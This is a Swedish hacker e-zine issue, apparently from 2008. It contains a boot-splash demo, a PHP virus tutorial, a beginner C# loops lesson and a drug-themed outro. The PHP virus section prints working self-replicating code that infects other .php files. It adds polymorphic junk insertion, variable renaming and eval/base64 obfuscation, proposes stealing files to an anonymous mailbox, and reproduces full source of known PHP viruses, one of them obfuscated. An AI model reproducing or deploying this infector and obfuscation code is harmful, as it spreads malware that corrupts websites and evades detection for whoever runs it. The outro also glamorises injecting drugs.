+låda (peka&klicka-gränssnittet) för att en dag ha ett dussintals biologiska 
+hårdvaruemulatorer inprogrammerade i pannloben. 
+
+Där spårade jag ur lite. Vad jag antar att jag vill framföra är att det ligger
+i människans natur att vilja lära sig, förstå hur saker och ting fungerar. När
+man lär sig hur någonting fungerar får man positiv feedback, man får en belöning
+i form av utsöndring av kemiska ämnen i hjärnan. Hjärnan behöver ingen yttre
+stimulans för detta, stimulansen skapas av hjärnan själv när man tänker ut en
+lösning. Folk som saknar viljan att lära sig och bara vill uppnå någonting där
+lärandet i sig är en biprodukt (kanske till och med en oönskad sådan när det 
+gäller programmering eller datorrelaterade uppgifter som kräver viss form av 
+programmering) är på ett sådant tidigt stadie i hierarkin att de måste få Den 
+Första Upplysningen för att förstå. Det var denna upplysning Pelle råkade ut 
+för när han insåg hur han associerar händelser i spel. Det behöver inte vara 
+någon stor upplysning eller ett halleluja-ögonblick, gnistan är ganska klen 
+jämfört med skogsbranden den startar. Utan gnistan, ingen skogsbrand. Utan
+viljan att lära sig, ingen kunskap. Men med viljan är möjligheterna oändliga.
+
+För er som vill gå vidare på egen hand har jag samlat ihop en länksamling.
+Eller ja, det är tre länkar, men 'länksamling' får det att låta bättre.
+
+IA Software Developer's Manual volym 1-2
+    http://www.intel.com/design/intarch/manuals/243190.htm
+    http://www.intel.com/design/intarch/manuals/243191.htm 
+    Volym 1 är en grundlig genomgång av arkitekturen som sådan (märk väl
+    endast CPUns arkitektur, inte gränssnitt till andra kort eller liknande)
+    Volym 2 är x86 instruktionsset med add-ons som MMX och de olika 
+    SIMD-setten. Mycket bra att ha till hands.
+
+The Art of ASSEMBLY LANGUAGE PROGRAMMING
+    http://www.arl.wustl.edu/~lockwood/class/cs306/books/artofasm/toc.html
+    Inte så jättebra att lära sig assemblerprogrammering från då den är
+    ganska matig och tar upp mycket som inte kan göras under 32-bitars
+    protected mode, det senare är precis det vi sysslat med nu. Den är 
+    väldigt grundlig och innehåller mycket man inte kan hitta i andra
+    dokument. Väl värd att läsa!
+
+För er icke-epileptiker där ute satte jag ihop en liten fin bootsplash med
+ljudeffekt som demonstrerar användandet av VGA text samt ljud- och 
+intervallgenerering med 8254an. Enjoy:
+
++rgAuI7AMcCO0I7YvABwsLbmQ7gAAuZCwegI5kLkYQwD5mG/IADHhQAASXyBxwIAxwUAALA05kO4
+my7mQMHoCOZAsQow7fvr/v7JdQXoBwCxCrAg5iDPhO10C2hBRGgAADDt6QgAaAAAaEFE/sWJ5WZg
+vp18Mf+1+qyxCNDgcgaLVgDpAwCLVgImiRWBxwIA/sl16P7NdeFmYVhYw///////////////////
+///////////////////////////////////////////////////////////////zn8/Af///////
+85hM/MhnD/////ATwfP5Juf////zk8nPyYYP////85PMn8nGf/////OYTIBJ5g//////////////
+///////////////////////////////////////////////////w4B//////////8OeP////////
+///nx///////////58f/////////8OeP//////////DgH///////////////////////////////
+//////////9zdWcgbWluIGtld2ssIHdlIGFpbnQgVkZIIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVao=
+
+Spara som valfri fil, kör base64 -di <valfri fil> > foo.bin, skriv foo.bin
+till USB-disk med dd (dd if=foo.bin of=/dev/sda förutsatt att sda är din 
+USB-disk och inte din porrfilmssamling) och boota.
+
+För de av er som av något godtyckligt skäl inte kan/vill/orkar/litar på mig 
+tillräckligt mycket för att köra ovanstående kod har jag spelat in ett litet 
+filmklipp och lagt upp på YouTube som visar den in action:
+
+    http://www.youtube.com/watch?v=eBGIQ7ZuuiU
+
+Fin.
+
+
+================================================================================
+0x03 - PHP-Virus, teori och praktik, del 2                                R34p3r
+================================================================================
+
+Inledning
+---------
+Så, i förra zinet började vi lite smått att kika på hur man kan ta och bygga ett
+virus i det eminenta språket PHP, vilket jag i detta zine tänkte spinna vidare
+på.
+
+Egentligen så är det inte så mycket mer introduktion än så, det som vi kommer
+att kika på den här gången är följande:
+
+        - Polymorfisk kod
+        - Enklare kryptering av phpkod
+
+Så, det är väl bara att börja. För er som inte har koden sedan förra numret
+finns den att hämta precis här under.
+
+Note #1: Ber er ha överseende med fel i koden då detta skrevs ihop alldeles för
+fort och att jag var lite halvdegig i kolan när detta gjordes.
+
+Note #2: Denna artikel(serie) syftar inte till att i slutändan ge alla skiddies
+ett komplett virus att leka runt med. Så om ni förväntar er färdig kod redo att
+köras efter varje avslutad moment/del så tror ni fel. Visst kan det vara kul
+att som "avancerad" användare ändå få lite färdig kod att pilla med, absolut,
+men jag *avskyr* folk som copy-pastear kod och gör dumheter med den utan att ha
+någon som helst aning om vad det är dom egentligen pysslar med.
+
+Denna artikel(serie) syftar till att visa på möjligheterna med främst PHP, men
+även andra, liknande språk. Den syftar INTE till att i slutändan producera ett
+virus som är skadligt och farligt att sprida. Är det det du som läsare är ute
+efter föreslår jag att du tar och studerar koden, lär dig PHP och sen sätter
+ihop kakan själv, det blir mycket roligare så :)
+
+Tidigare kod
+------------
+<?php
+$ln=16;
+$fh=fopen(__FILE__,'r');
+fseek($fh, $ln);
+$content=fread($fh, 1611);
+fclose($fh);
+$cd=opendir('.');
+while($f = readdir($cd)) {
+   if(strstr($f, '.php')) {
+      $offer=fopen($f, 'r+');
+      $ocont=fread($offer, filesize($f));
+      if(!strstr($ocont, 'phpv')) {
+         $possible=0;
+         $occont=$ocont;
+
+         while(strstr($occont, 'function ')) {
+            $occont=strstr($occont, 'unction ');
+            $possible++;
+         }
+
+         $which=mt_rand(1,$possible);
+         $occont=$ocont;
+         while($which--) {
+            $occont=strstr($occont, 'function ');
+         }
+         $occont=strstr($occont, '{');
+         $before=strlen($ocont)-strlen($occont)+1;
+         $check=0;
+         $i=0;
+         do {
+            if($occont{$i}=='{') {
+               $check++;
+            }
+            if($occont{$i++}=='}') {
+               $check--;
+            }
+         }
+         while($check);
+
+         fseek($offer, $before);
+         $funccont=fread($offer, $i+1);
+         fseek($offer, $before+$i-1);
+         $aftercont=fread($offer, filesize($f)-$before-$i
+         -strlen(strstr($ocont, '?>')));
+         $coundj=0;
+         $newvar='';
+
+         do {
+            $newvar.=chr(mt_rand(97,122));
+            $countj++;
+         } 
+         while($countj<mt_rand(5,15));
+
+         rewind($offer);
+         $beforecont=fread($offer, $before);
+         rewind($offer);
+         fwrite($offer, $beforecont.chr(13).chr(10).'$ln='.($before
+         +strlen($before)+9).';'.chr(13).chr(10).$content.chr(13).
+         chr(10).$newvar.'(); }'.$aftercont.chr(13).chr(10).'function '
+         .$newvar.'() {'.chr(13).chr(10).$funccont.'?'.'>');
+      }
+   }
+}
+?>
+
+Trashkod
+--------
+Vad är detta då? Jo, trashkod är precis som namnet antyder bara skräpkod
+utan någon som helst funktionalitet, det enda det gör är att "skräpa ner"
+filen som den sätts in i, för att försvåra upptäckten av vår illasinnade
+kod.
+
+Så hur gör vi det på ett smart och snyggt sätt då?
+Det hela är egentligen mycket enkelt, det handlar egentligen bara om att
+generera ett antal slumpmässiga tecken och sen infoga dom på slumpmässiga
+platser i vårt mål.
+
+Ett exempel:
+
+<?php
+$string=strtok(fread(fopen(__FILE__,'r'), filesize(__FILE__)),chr(13).chr(10));
+$newcont='<?php'.chr(13).chr(10);
+while ($string && $string!='?>') {
+   if(rand(0,1)) {
+      if (rand(0,1)) {
+         $newcont.='// '.trash('').chr(13).chr(10);
+      }
+      if(rand(0,1)) {
+         $newcont.='$'.trash('').'='.chr(39).trash('').chr(39).';'.
+         chr(13).chr(10);
+      }
+      if(rand(0,1)) {
+         $newcont.='$'.trash('').'='.rand().';'.chr(13).chr(10);
+      }
+   }
+   $string=strtok(chr(13).chr(10));
+   if ($string{0}!='/' && $string{0}!='$') {
+      $newcont.=$string.chr(13).chr(10);
+   }
+   fwrite(fopen(__FILE__, 'w'),$newcont);
+}
+
+function trash($var) {
+        do {
+                $var.=chr(rand(97,122));
+        } while (rand(0,7));
+        return $var;
+}
+?>
+
+Värt att noter att jag nu expanderat koden lite för att göra det lättare att
+hänga med.
+
+Nåja, vad händer då? Jo, vi öppnar som vanligt filen vi exekverar och kör igenom
+hela och därefter slumpmässigt lägger dit endera en kommentar, eller en
+variabel.
+Funktionen trash() används för att slumpa fram lite bokstäver. Är du osäker på
+vad chr() gör och vad siffrorna innebär föreslår jag en titt på
+http://php.net/chr samt http://www.asciitable.com/
+
+Bara denna kod i sig är ganska trevlig då den tenderar att öka storleken på
+filen ganska dramatiskt efter ett antal exekveringar, detta går naturligtvis att
+ändra på genom att endera ändra rand()-parametrarna i trash-funktionen, eller
+bara lägga till fler saker till $newcont.
+
+Ännu ett steg är att lägga till ändringar av variabelnamnen också, vilket vi kan
+trycka in i samma kodsnutt.
+
+Visar dock koden för sig innan vi klumpar ihop den;
+
+<?php
+$cv=array('changevars','content','newvars','counti','countj','trash');
+$c=fread(fopen(__FILE__,'r'),filesize(__FILE__));
+$ci=0;
+while($cv[$ci]) {
+        $c=str_replace($cv[++$ci], trash('',0), $c);
+}
+fwrite(fopen(__FILE__,'w'),$c);
+
+function trash($newvar, $cj) {
+        do {
+                $newvar.=chr(rand(97,122));
+        } while(++$cj<rand(5,15));
+        return $newvar;
+}
+?>
+
+Klumpar vi ihop detta skulle det kunna bli något i stil med detta:
+
+<?php
+$string=strtok(fread(fopen(__FILE__,'r'), filesize(__FILE__)),chr(13).chr(10));
+$newcont='<?php'.chr(13).chr(10);
+$cv=array('changevars','content','newvars','counti','countj','trash');
+$ci=0;
+while ($string && $string!='?>') {
+         if(rand(0,1)) {
+                  if (rand(0,1)) {
+                           $newcont.='// '.trash('').chr(13).chr(10);
+                  }
+                  if(rand(0,1)) {
+                         $newcont.='$'.trash('').'='.    \
+                         chr(39).trash('').chr(39).';'.  \
+                         chr(13).chr(10);
+                }
+                if(rand(0,1)) {
+                         $newcont.='$'.trash('').'='.rand().';'.chr(13).chr(10);
+                }
+        }
+        $string=strtok(chr(13).chr(10));
+        if ($string{0}!='/' && $string{0}!='$') {
+                $newcont.=$string.chr(13).chr(10);
+        }
+        while($cv[$ci]) {
+                $newcont.=str_replace($cv[++$ci], trsh(''), $c);
+        }
+        fwrite(fopen(__FILE__, 'w'),$newcont);
+}
+
+function trsh($var, $cj=0) {
+        do {
+                $var.=chr(rand(97,122));
+   } while (++$cj<rand(0,15));
+   return $var;
+}
+function trash($var) {
+   do {
+      $var.=chr(rand(97,122));
+   } while (rand(0,7));
+   return $var;
+}
+?>
+
+Nu när vi har lite mysig kod som ändrar sig efter varje körning så är det
+dags att ta sig an nästa del i denna artikel, nämligen;
+
+Enklare kryptering av phpkod
+----------------------------
+För att förhindra att folk tar och kikar på vår kod alltför mycket så kan vi
+applicera lite "kryptering" på den. Nu är visserligen detta ganska svårt att
+genomföra i PHP, men det finns ett sätt som är ganska välbeprövat vid det här
+laget, men som inte alls gör koden oåtkomlig. Vad som händer är att processen
+för att komma åt den blir lite längre bara. Detta borde dock räcka för att den
+vanliga hobbykodaren ska lägga ner sitt tafatta försök att reversa vårt lilla
+virus :)
+
+Vad jag pratar om är helt enkelt en simpel kombination av eval() och
+base64_encode()/base64_decode(). Hur går detta till då? Jo, eval() används för
+att evaluera kod, dvs behandla en text som ren PHP. För en bättre förklaring
+föreslår jag ett besök hos http://php.net/eval
+Base64 antar jag att alla är mer eller mindre familjära med, men hur själva
+algoritmen fungerar tänker jag inte ta upp här, även fast den är ganska simpel.
+Det är inga nycklar eller så inblandade. Ett exempel på base64 finns nedan;
+
+   Plain text:   hej
+   Base64:      aGVq
+
+Detta är alltså vad vi ska använda oss av för att göra vår PHP-kod oläslig vid
+första anblicken.
+
+Principen är som sagt enkel, och proceduren ser ut så här:
+<?php
+eval(base64_decode("ZWNobyAiVGphIDpEIjs="));
+?>
+Detta kommer php tolka som;
+<?php
+echo "Tja :D";
+?>
+vilket också är det resultat vi kommer att se.
+
+Som ni (förhoppningsvis) läste i början av artikeln så ämnar jag inte att ge er
+kompletta bitar efter varje del, därför så tänker jag inte visa hur man
+implementerar detta på den kod vi redan har. Thats life, now lets continue.
+
+Det finns även andra sätt att göra saker och ting mycket jobbigare att förstå
+och läsa, däribland att t.ex. byta ut alla siffror mot lite matematiska
+motsvarigheter. Exempel:
+
+   $n = 8;
+
+Så, vilka uträkningar ger produkten 10? Det finns ganska många, men några
+exemepl finner ni nedan;
+
+   $n = (24-16);
+   $n = (7+1);
+   $n = (80/10);
+   etc..
+
+Detta har visserligen ingenting med kryptering att göra, men man kan inte direkt
+säga att base64 är "kryptering" heller, utan snarare göra det svårare att läsa
+koden. Detta gör att man SKULLE kunna slå ihop de två avsnitten här, men det ser
+bättre ut att ha fler sektioner ;)
+
+Hur skulle vi kunna utföra detta i PHP då? Någonting i den här stilen kanske;
+
+<?php
+$nc=fread(fopen(__FILE__,'r'),filesize(__FILE__));
+$c=-1; $n='';
+while(++$c<strlen($nc)) {
+   if(ord($nc{$c})>47 && ord($nc{$c})<58) {
+      $n=$nc{$c};
+      while(ord($nc{++$c})>47 && ord($nc{$c})<58) {
+         $n.=$nc{$c};
+      }
+      $rn=rand(1,10);
+      switch(rand(1,3)) {
+         case 1:
+            $ct.='('.($n-$rn).'+'.$rn.')';
+            break;
+         case 2:
+            $ct.='('.($n+$rn).'-'.$rn.')';
+            break;
+         case 3:
+            $ct.='('.($n*$rn).'/'.$rn.')';
+            break;
+      }
+   }
+   $ct.=$nc{$c};
+   $n='';
+}
+fwrite(fopen(__FILE__,'w'),$ct);
+?>
+
+Testar vi det på en fil som innehåller detta;
+<?php
+$tja = 10;
+$tjo = 32597439090532;
+$hej = 2520;
+$n = 780;
+$q = 6921;
+?>
+så fick jag resultatet;
+<?php
+$tja = (0+10);
+$tjo = (32597439090500-7);
+$hej = (2524-4);
+$n = (7020/9);
+$q = (6923-2);
+?>
+
+
+Efter sex exekveringar ser $tja ut så här:
+$tja =(((((((25927-7)/(11-1))/((8+1)-(5/1)))/(((20/2)-(36/6))+((300/6)/(90/9))))
++((((3+1)+(13-7))/(-(12/3)+(12/2)))+(-((9+1)/(3-1))+((40/10)+(-2+6)))))/(((((31+
+10)-(10-5))/((20/5)+(20/10)))+(((125/5)-(3+7))/((5-4)+(12-10))))-((((84/3)-(1+5)
+)-((15-6)-(-4+5)))-(((108/3)-(14-6))/((64/8)/(3-1))))))/((((((90/2)/(40/8))+((80
+/8)/(7/7)))-((-(9-6)+(21/7))+((10-2)/(11-10))))+((((11+4)-(-1+2))-((72-9)/(63/7)
+))-(((94-4)/(30/10))/(-(10/5)+(2+5)))))-(((((618-2)-(19-9))/((-6+9)+(6-3)))-(((1
+8-6)-(36/6))-(-(24/8)+(64/8))))/((((4-4)/(80/8))/((35+10)/(2+7)))+(((14-4)-(24/3
+))+((19-1)-(2+8)))))));
+
+Försökt att hänga med i den där uträkningen ni ;)
+
+Summan av kardemumman (typ)
+---------------------------
+Vad har vi nu? Jo, en massa kodsnuttar som inte gör så väldans mycket själva,
+men när man sätter ihop dessa till synes oskyldiga kodsnuttar så kan dessa
+utgöra ett ganska kraftfullt "verktyg".
+
+Jag har nu under två artiklar gått igenom lite basic saker som man kan ha nytta 
+av om man är intresserad av att programmera virus för scriptspråk. I nuläget så 
+finns det inget som jag direkt känner att "Ja, det där måste jag ta upp", och 
+därav så får vi se om det eventuellt blir en del tre eller inte. Önskemål
+mottages dock, men hur ni ska kontakta mig är upp till er själva att klura ut.
+
+Avslutningsvis så tänkte jag bara delge er lite tankar som ständigt dyker upp, 
+och som man "borde" göra något åt, men aldrig orkar. Detta är alltså förslag på
+saker som man skulle kunna implementera i ett PHP-virus, vissa har jag gjort, 
+vissa inte.
+
+   - Viruset har en liten "databas" med kända hål i specifika PHP-versioner och
+     anpassar sig automatiskt till den version det körs på, och utnyttjar vissa
+     hål om möjligheten finns.
+   - Viruset letar sig vidare genom andra mappar för att hitta fler föremål att
+     infektera. Till detta kan glob("*.php") vara till stor hjälp.
+   - Med lite tålamod så och tillräckliga kunskaper om virusprogrammering för
+     binära filer så skulle man kunna göra ett phpvirus som i sin tur är
+     kapabelt till att infektera binärer också.
+   - Orkar man inte implementera infektering av binärer så går det alltid att
+     infektera andra filer, typ html-filer (med lite javascript-hjälp).
+   - Få viruset att kopiera och komprimera alla filer den kommer åt, eller vissa
+     specifika filtyper och skicka till en (förslagsvis) anonym email, eller
+     ladda upp det på något förbestämt ställe (lite osäkert, om man inte kan få
+     viruset att ringa hem och kolla om det finns ett nytt ställe att ladda upp
+          saker på).
+
+Detta är bara spontana tankar som man teoretiskt (och även praktiskt) skulle
+kunna genomföra i PHP, sen är det upp till en själv vart man vill lägga ribban
+någon stans, men språket har potentialen som krävs, helt klart!
+
+Avslutningsvis bjuder jag på några existerande php-virus källkoder.
+
+Halvkänt virus som spreds i emails
+----------------------------------
+
+<?php
+$OOO0O0O00=__FILE__;
+$O00O00O00=__LINE__;
+$OO00O0000=34948;
+eval((base64_decode('JE8wMDBPME8wMD1mb3BlbigkT09PM
+E8wTzAwLCdyYicpO3doaWxlKC0tJE8wME8wME8wMClmZ2V0cyg
+kTzAwME8wTzAwLDEwMjQpO2ZnZXRzKCRPMDAwTzBPMDAsNDA5N
+ik7JE9PMDBPMDBPMD0oYmFzZTY0X2RlY29kZShzdHJ0cihmcmV
+hZCgkTzAwME8wTzAwLDM3MiksJ0VBWnpCWWdNSlA1N2U4bEtXV
+WFMUm5DeC93TzBUaUZJaDF2a3RmMkd5cFFEVnF1YjlYSDZkcmo
+0Y3NOM21Tbys9JywnQUJDREVGR0hJSktMTU5PUFFSU1RVVldYW
+VphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODk
+rLycpKSk7ZXZhbCgkT08wME8wME8wKTs=')));
+return;
+?>
+
+Neworld.PHP (variant på PHP.Pirus)
+----------------------------------
+<?php
+
+$vir_string = "Neworld.PHP\n";
+$virstringm = "Welcome To The New World Of PHP Programming\n";
+$virt       = $vir_string . $virstringm;
+
+echo   $virt;
+
+$all = opendir('C:\Windows\\');
+while ($file = readdir($all))
+{
+   $inf = true;
+   $exe = false;
+
+   if ( ($exe = strstr ($file, '.php')) || ($exe = strstr ($file, '.html'))
+   || ($exe = strstr ($file, '.htm')) || ($exe = strstr ($file, '.htt')) )
+   if ( is_file($file) && is_writeable($file) )
+   {
+      $new = fopen($file, "r");
+      $look = fread($new, filesize($file));
+      $yes = strstr ($look, 'neworld.php');
+      if (!$yes) $inf = false;
+   }
+   
+   if ( ($inf=false) )
+   {
+      $new = fopen($file, "a");
+      $fputs($new, "<!-- ");
+      $fputs($new, "Neworld.PHP - ");
+      $fputs($new, "Made By Xmorpfic, ");
+      $fputs($new, "www.shadowvx.com/bcvg, ");
+      $fputs($new, "The Black Cat Virii Group.");
+      $fputs($new, "--->");
+      $fputs($new, "<?php ");
+      $fputs($new, "include(\"");
+      $fputs($new, __FILE__);
+      $fputs($new, "\"); ");
+      $fputs($new, "?>");
+      return;
+   }
+}
+closedir($all);
+// Neworld.PHP Virus - Made By Xmorfic, www.shadowvx.com/bcvg, Black Cat Virii
+// Group.
+?>
+
+PHP.Pirus (det första viruset skrivet i PHP)
+--------------------------------------------
+<?php
+$handle=opendir('.');
+while ($file = readdir($handle))
+{ $infected=true;
+  $executable=false;
+
+ if ( ($executable = strstr ($file, '.php')) || ($executable = strstr ($file,
+ '.htm')) || ($executable = strstr ($file, '.php')) )
+ if ( is_file($file) && is_writeable($file) )
+ {
+   $host = fopen($file, "r");
+   $contents = fread ($host, filesize ($file));
+   $sig = strstr ($contents, 'pirus.php');
+   if(!$sig) $infected=false;
+ }
+ //infect
+ if (($infected==false))
+  {
+   $host = fopen($file, "a");
+   fputs($host,"<?php ");
+   fputs($host,"include(\"");
+   fputs($host,__FILE__);
+   fputs($host,"\"); ");
+   fputs($host,"?>");
+   fclose($host);
+   return;
+ }
+}
+closedir($handle);
+?>
+
+
+================================================================================
+0x04 Introduktion till C#, del 4                                          Retard
+================================================================================
+Förord
+------
+      Ännu en ny del, vi kommer att lära oss om while- samt for-satser denna
+    gång. Som vanligt kommer först en text-del och sist kommer ett par uppgifter
+    att träna sig lite på.
+Loopar
+------
+      Loopar är till för att utföra instruktioner upprepade gånger, tills ett
+    villkor är uppfyllt. Ponera att du har en textfil som du vill läsa och 
+    skriva ut i ditt program, väldigt ofta måste man då läsa rad för rad 
+    istället för hela textfilen på en gång. När man då inte vet hur många rader
+    en fil har måste det finnas ett enkelt sätt att gå igenom filen tills det
+    inte finns fler rader. En loop hade passat perfekt för detta.
+
+    Det finns olika typer av loopar, for- samt while-loopar. Dessa två är bäst
+    att använda vid olika tillfällen. En for-loop ska man i regel använda om
+    man vet hur många gånger en instruktion ska utföras, eller om ens program
+    enkelt kan räkna ut det.
+
+    En while-loop ska i regel användas när man ej vet hur många gånger en 
+    instruktion måste utföras, t.ex. om man ej vet hur många rader en textfil
+    innehåller.
+
+For-loop
+--------
+      Som jag sa tidigare ska en for-loop användas när man vet hur många gånger
+    någonting ska utföras. Här kommer ett kodexempel.
+
+    [kod]
+    for(int i = 0; i < 3; i++)
+    {
+      Console.WriteLine(i);
+    }
+    [/kod]
+
+    Inte värst komplicerat egentligen, vi börjar med att skriva for och en
+    parentes. Inne i parentesen skapar vi en integer vid namn i (eller vad man
+    nu föredrar) och ger den ett värde, som kan vara vilket som helst. I detta
+    fall väljer vi att ge integern värdet noll.
+     Efter att vi gett integern ett värde, avslutar vi med ett semikolon och går
+    vidare till kontrollen. Det är här vi ska skriva hur länge vår loop ska
+    fortsätta att köras. 
+      I mitt exempel väljer jag att köra loopen så länge som i är mindre än 3.
+    Även här avslutar vi med ett semikolon för att gå vidare in till nästa steg
+    i loopen. Det är nu vi ska bestämma vad som ska hända när programmet gått
+    igenom loopen ett varv. I detta fall vill jag plussa på i med ett, men även
+    här kan man göra mycket annat. T.ex. i = i + 5 för att plussa på med fem på
+    det ursprungliga läget. 
+      Det var det sista vi skulle göra innan vi avslutar parentesen. Notera att
+    vi inte använde semikolon i slutet av parentesen, utan går direkt och gör en
+    slutparentes.
+
+    Vidare ska vi nu skapa ett nytt kodblock, precis som vi gör i if-satserna,
+    inne i detta kodblock ska vi skriva vad vi vill få utfört om i < 3.
+      Om du vill titta lite närmre på hur dessa loopar fungerar och i vilken
+    ordning den går igenom kan du använda dig av debug-mode i Visual Studio,
+    istället för att använda ctrl + f5 för att testa ditt program kan du
+    använda dig utav knappen F10 istället. Sedan kan du stega dig vidare igenom
+    programmet genom att klicka på F10 igen tills programmet stängs.
+
+    För att förklara händelseförloppet lite enkelt kommer ditt program, om du
+    skrivit av koden ovan att gå igenom så här:
+     * skapa en int vid namn i, som har värdet 0.
+     * kontrollera om i är mindre än 3, som så är fallet, kör koden.
+     * Skrivs ut en nolla.
+     * Lägg på värdet i med ett.
+     * kontrollera om i (1 denna gång) är mindre än 3, kör koden
+     * Skrivs ut en etta.
+     * Lägg på värdet med ett.
+     * Kontrollera om i (2 denna gång) är mindre än tre, kör koden.
+     * Skrivs ut en tvåa.
+     * Lägg på värdet med ett.
+     * Kontrollera om i (3 denna gång) är mindre än tre.
+       Denna gång är det inte fallet, då avslutas loopen och programmet går
+    vidare genom programmet.
+    Som du såg skapades bara en integer en gång, medan kontrollen skedde varje
+    gång. Om integern skulle skapas och sätta sitt värde till noll vid varje
+    runda skulle vi få en så kallad infinite loop, mer om detta senare.
+
+While-loop
+----------
+                Engelskt ord             Svensk översättning
+                ------------             -------------------
+                   while                  medan, under tiden
+
+
+    While-loopar är lätta att förstå. Ett kodexempel följer nedan:
+    [kod]
+    int i = 0;
+    while(i < 3)
+    {
+      Console.WriteLine(i);
+      i++;
+    }
+    [/kod]
+
+    Som vanligt, vi skapar en integer med värdet noll. Denna gång innan vår
+    loop startas. Vi skriver sedan while följt av en parentes, och innanför
+    denna parentesen skrivs villkoret som ska vara sant för vår kod ska köras.
+
+    För att även här förklara händelseförloppet lite enkelt kommer ditt program
+    om du skrivit av koden ovan att gå igenom en snarlik process som nedan:
+     * Kontrollera om i är mindre än tre
+     * Kör koden. (Dvs skriv ut 0 samt addera i med 1)
+     * Kontrollera om i är mindre än tre
+     * Kör koden. (Dvs skriv ut 1 samt addera i med 1)
+     * Kontrollera om i (2) är mindre än tre
+     * Kör koden. (Dvs skriv ut 2 samt addera i med 1)
+     * Kontrollera om i (3) är mindre än tre
+     * Kör ej koden, gå vidare i programmet.
+
+do-while
+--------
+    [kod]
+    int i = 3;
+    do
+    {
+    Console.WriteLine(i);
+    i--;
+    } while(i > 1);
+    [/kod]
+
+    I en do-while-sats körs alltid loopens kod igenom åtminstonde en gång, när
+    uttrycket har körts igenom en gång kontrolleras om uttrycket innanför
+    while() är sant. Om så är fallet körs loopen igenom tills uttrycket blir
+    falskt.
+
+Infinite loop
+-------------
+      En så kallad Infinite loop är en loop som aldrig uppnår ett värde som får
+    loopen att avslutas, det vill säga en oändlig loop. Ett exempel på en sådan
+    loop ser du nedan.
+    [kod]
+    while(true)
+    {
+      Console.WriteLine("Oändlig loop");
+    }
+    [/kod]
+
+    För att stjäla ett skämt: “The Cray-3 is so fast it can execute an infinite
+    loop in under 2 seconds!”
+
+================================================================================
+0x05 Introduktion till C#, del 4 - uppgifter                              Retard
+================================================================================
+
+Uppgift ett
+-----------
+
+      .--------------------------------------------------.
+      | cmd.exe                                   _ [] x |
+      |--------------------------------------------------|
+      |1                                               |^|
+      |2                                               | |
+      |3                                               | |
+      |                                                | |
+      |                                                |v|
+      .--------------------------------------------------.
+
+      Förklaring: Använd dig utav en for-loop och skriv ut alla tal upp till
+      tre. Du ska börja på ett.
+
+Uppgift två
+-----------
+
+      .--------------------------------------------------.
+      | cmd.exe                                   _ [] x |
+      |--------------------------------------------------|
+      |Skriv in ett användarnamn: [Wise]               |^|
+      |Användarnamnet är fel                           | |
+      |Skriv in ett användarnamn: [Houdini]            | |
+      |Hej Houdini!                                    | |
+      |Tryck på valfri tangent för att fortsätta...    |v|
+      .--------------------------------------------------.
+
+      Förklaring: Gör ett program som kräver ett användarnamn. Så länge som
+      användaren INTE skriver in "Houdini" ska du be dem skriva in 
+      användarnamnet igen. När de skrivit in Houdini ska de mötas av en hälsning
+
+
+Stjärnuppgift ett
+-----------------
+
+      .--------------------------------------------------.
+      | cmd.exe                                   _ [] x |
+      |--------------------------------------------------|
+      |Nej                                             |^|
+      |Nej                                             | |
+      |Nej                                             | |
+      |Nej                                             | |
+      |Nice!                                           | |
+      |                                                | |
+      |Tryck på valfri tangent för att fortsätta...    |v|
+      .--------------------------------------------------.
+
+      Förklaring: Lär dig om slumptal. Du ska slumpa fram ett tal mellan 1 och
+      fem. För varje varv i loopen ska den slumpa en ny siffra, och så länge som
+      den siffran inte är fem ska "Nej" skrivas ut. När femman lyckats slumpas 
+      fram ska programmet skriva ut "Nice!" och avslutas. 
+
+
+
+================================================================================
+0x06 Outro                                                              swestres
+================================================================================
+Vår dag lider mot sitt slut. Vi dricker upp ölen och beger oss ut i stadens
+djungel, vårt hem: Helvetet. I en gränd hittar vi Oskar, utslagen och eländig. 
+Ur en sliten väska lirkar han upp en avknäckt sked med en sotig undersida.
+Med stil, grace och finess förbereder han dagens höjdpunkt; den första fixen.
+I skeden kokar den, lösningen på alla problem. En lösning innehållandes
+ambrosia för intravenöst bruk. Tändarens låga slickar skedens undersida, värmen
+sprider sig. I skeden hamnar filtret likt vinterns första snöflinga på en åker.
+Oskar sträcker sig efter sprutan likt en man i en öken sträcker sig efter 
+vatten. Den kokande sjön som för en stund sedan sågs i skedens konkava del
+har nu försvunnit och om ett ögonblick kommer dess svalnade rest beblanda
+sig med främmande vätskor i Oskars blodomlopp.
+
+Du är Oskar, vi är din drog. Fixens effekter kommer att avta. Du kommer
+leva på en fet AT tills nästa utgåva. Tills dess, stig geil!
+Fre 25 Jul 2008 20:54:10 CEST
